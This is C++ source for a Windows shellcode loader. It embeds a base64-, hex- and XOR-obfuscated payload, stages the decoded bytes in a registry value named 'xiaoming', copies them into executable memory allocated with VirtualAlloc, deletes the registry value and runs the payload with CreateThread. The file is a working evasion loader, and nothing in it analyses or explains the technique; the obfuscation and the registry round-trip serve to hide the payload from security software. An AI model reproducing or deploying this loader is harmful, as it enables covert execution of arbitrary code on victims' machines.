#include <iostream>
#include <Windows.h>
#include <utility>
#include <map>
#include <string>
#include <cstddef>

using namespace std;

#pragma comment(lib, "Advapi32.lib")

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string base64_encode(char const* bytes_to_encode, int in_len);
std::string base64_decode(std::string& encoded_string);
std::string string_to_hex(const std::string& input);
std::string hex_to_xor(const std::string& input);

int WINAPI WinMain(HINSTANCE hInstance,      // handle to current instance
	HINSTANCE hPrevInstance,  // handle to previous instance
	LPSTR lpCmdLine,          // command line
	int nCmdShow              // show state
)
{string shellcode = "NjNkNzFjN2I2Zjc3NTc5ZjlmOWZkZWNlZGVjZmNkY2VjOWQ3YWU0ZGZhZDcxNGNkZmZkNzE0Y2Q4N2Q3MTRjZGJmZDcxNGVkY2ZkNzkwMjhkNWQ1ZDJhZTU2ZDdhZTVmMzNhM2ZlZTM5ZGIzYmZkZTVlNTY5MmRlOWU1ZTdkNzJjZGRlY2VkNzE0Y2RiZjE0ZGRhM2Q3OWU0ZmY5MWVlNzg3OTQ5ZGVhZWQxNDFmMTc5ZjlmOWZkNzFhNWZlYmY4ZDc5ZTRmY2YxNGQ3ODdkYjE0ZGZiZmQ2OWU0ZjdjYzlkNzYwNTZkZTE0YWIxN2Q3OWU0OWQyYWU1NmQ3YWU1ZjMzZGU1ZTU2OTJkZTllNWVhNzdmZWE2ZWQzOWNkM2JiOTdkYWE2NGVlYTQ3YzdkYjE0ZGZiYmQ2OWU0ZmY5ZGUxNDkzZDdkYjE0ZGY4M2Q2OWU0ZmRlMTQ5YjE3ZDc5ZTRmZGVjN2RlYzdjMWM2YzVkZWM3ZGVjNmRlYzVkNzFjNzNiZmRlY2Q2MDdmYzdkZWM2YzVkNzE0OGQ3NmQwNjA2MDYwYzJmNTlmZDYyMWU4ZjZmMWY2ZjFmYWViOWZkZWM5ZDYxNjc5ZDMxNjZlZGUyNWQzZThiOTk4NjA0YWQ3YWU1NmQ3YWU0ZGQyYWU1ZmQyYWU1NmRlY2ZkZWNmZGUyNWE1YzllNjM4NjA0YTc2MGM5ZjlmOWZjNWQ3MTY1ZWRlMjc3Mjg5OWY5ZmQyYWU1NmRlY2VkZWNlZjU5Y2RlY2VkZTI1YzgxNjAwNTk2MDRhNzRlNmM0ZDcxNjVlZDdhZTRkZDYxNjQ3ZDJhZTU2Y2RmNzlmYWQ1ZjFiY2RjZGRlMjU3NGNhYjFhNDYwNGFkNzE2NTlkNzFjNWNjZmY1OTVjMGQ3MTY2ZTI1ODA5ZjlmOWZmNTlmZjcxZmFjOWY5ZmQ2MTY3ZmRlMjY5YjlmOWY5ZmRlMjVlYWQ5MDExOTYwNGFkNzE2NmVkNzE2NDVkNjU4NWY2MDYwNjA2MGQyYWU1NmNkY2RkZTI1YjI5OTg3ZTQ2MDRhMWE1ZjkwMWEwMjllOWY5ZmQ3NjA1MDkwMWIxMzllOWY5Zjc0MmM3NjdiOWU5ZjlmNzcxZDYwNjA2MGIwZmRmMGYwZWJlY2ViZWRmZWVmYjJhZGIxZjJmNmYxYjFmNWVjOWY1YmJhMjQxMGMzMzIwOGNmMzI5OTIyNDkwMTQ2OGU3NWUyMjY0OThmNDFiYmVlNzNjOTVkYjgwYzhkNDRiMmE4MmY3MTY1NDA1Y2Y2MWVjMDBjYjk5NTE0MzQ5ZmFhNjJmMGNhMDQ3NmI4MmU1MDI1MDBmOGQ4OWZjYWVjZmFlZGIyZGVmOGZhZjFlYmE1YmZkMmYwZTVmNmYzZjNmZWIwYWFiMWFmYmZiN2ZjZjBmMmVmZmVlYmY2ZmRmM2ZhYTRiZmQyY2NkNmRhYmZhZWFmYjFhZmE0YmZjOGY2ZjFmYmYwZThlY2JmZDFjYmJmYThiMWFmYTRiZmQ2ZjFmOWYwY2ZmZWViZjdiMWFjYTRiZmIxZDFkYWNiYmZkY2QzY2RiZmFjYjFhZWIxYWJhZmE4YTlhOGE0YmZjYmVkZjZmYmZhZjFlYmIwYTliMWFmYTRiZmZhZjFiMmQ2ZDFiNjkyOTU5ZmU1MTNkMjI1N2JiNGIyOTFiM2ZjODI2ZTc4YmFlNWZhNGE5YmVjZTg0ODIyNWRiOGVmZGYzYTk3NzQ5NWExYTdmMWQ1NzEyYjBjMTYzODAzOGM0YWE2MGJkZjMxZTJlN2E0NTNmMGM2YTA1MGE2Yjg3ODFmNDUwOTMyMWI3OTNmNWY2YWU4MTMyNGI3MmFkOGEyN2YzZTM5N2YxY2M1MzJiNTU3MTExMmJjMzE4YzgwMzRjY2MzMWZiYjA1MGQwNTgyZjVhY2YwMGRmNThlMzk1M2YzZDVhMDRlNTU4NjFmYTJiYWZkOTE5NTU5N2I5ZTc3Y2ZiYzE2MmU5OTRlNzFmMjNjOTYyMmE2ZjM1NDU3MjIxMjYyZWVjYzExYWZkZTk0NWVlMTRhYjM5ZGExZTZiYTYzYmQ2OTVjMTdiYjMxZThmODAwY2IxMjk1Yzc2ODYzM2VlMTVkNmFjMjhiYjM0MjkwNDllYjAwNjQ1NTg1ZDI5ZmRlMjE2ZjJhM2RjOTYwNGFkN2FlNTYyNTlmOWZkZjlmZGUyNzlmOGY5ZjlmZGUyNmRmOWY5ZjlmZGUyNWM3M2JjYzdhNjA0YWQ3MGNjY2NjZDcxNjc4ZDcxNjZlZDcxNjQ1ZGUyNzlmYmY5ZjlmZDYxNjY2ZGUyNThkMDkxNjdkNjA0YWQ3MWM1YmJmMWE1ZmViMjlmOTE0OThkNzllNWMxYTVmZWE0OGM3YzdjN2Q3OWE5ZjlmOWY5ZmNmNWM3N2UwNjI2MDYwYWVhZWFiYjFhZWFlYWFiMWFlYTlhYmIxYWVhYWE4OWY4NmY2M2YxMjYw";
    std::string decoded = base64_decode(shellcode);
    string str = string_to_hex(decoded);
    string sh3llc0de = hex_to_xor(str);

	RegSetValueExA(HKEY_CURRENT_USER, "xiaoming", 0, REG_BINARY, (CONST BYTE*)sh3llc0de.data(), sh3llc0de.size());
	LPBYTE ptr = (LPBYTE)VirtualAlloc(0, 800, 0x3000, 0x40);
	LPDWORD data_len = new DWORD;
	RegQueryValueExA(HKEY_CURRENT_USER, "xiaoming", NULL, NULL, NULL, data_len);
	RegQueryValueExA(HKEY_CURRENT_USER, "xiaoming", NULL, NULL, ptr, data_len);
	RegDeleteValueA(HKEY_CURRENT_USER, "xiaoming");
	HANDLE handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, 0, 0, 0);
	WaitForSingleObject(handle, -1);

	return 0;
}



static inline bool is_base64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}
//A\nB                          3
std::string base64_encode(char const* bytes_to_encode, int in_len) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i)
    {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while ((i++ < 3))
            ret += '=';

    }

    return ret;

}

std::string base64_decode(std::string& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::string ret;

    while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
    }

    return ret;
}

std::string string_to_hex(const std::string& input)
{
    std::string output;
    size_t len = input.length();

    map<char, unsigned int> char_to_int = {
    {'0',0x0},{'1',0x1},{'2',0x2},{'3',0x3},
    {'4',0x4},{'5',0x5},{'6',0x6},{'7',0x7},
    {'8',0x8},{'9',0x9},{'a',0xa},{'b',0xb},
    {'c',0xc},{'d',0xd},{'e',0xe},{'f',0xf}
    };

    for (unsigned int i = 0; i < len; i++)
    {
        unsigned int n1 = char_to_int[input[i]] * 0x10;
        i++;
        unsigned int n2 = char_to_int[input[i]];
        unsigned int n = n1 + n2;
        char c = (char)n;
        output += c;
    }

    return output;
}

std::string hex_to_xor(const std::string& input)
{
    int nLen = input.size();
    int nKey = (int)input[nLen - 1];
    std::string output;
    for (int i = 0; i < nLen - 1; ++i)
    {
        int nTmp = (int)input[i];
        int n1 = 0xff - (nTmp ^ nKey);
        char cTmp = (char)n1;
        output += cTmp;
    }
    return output;
}
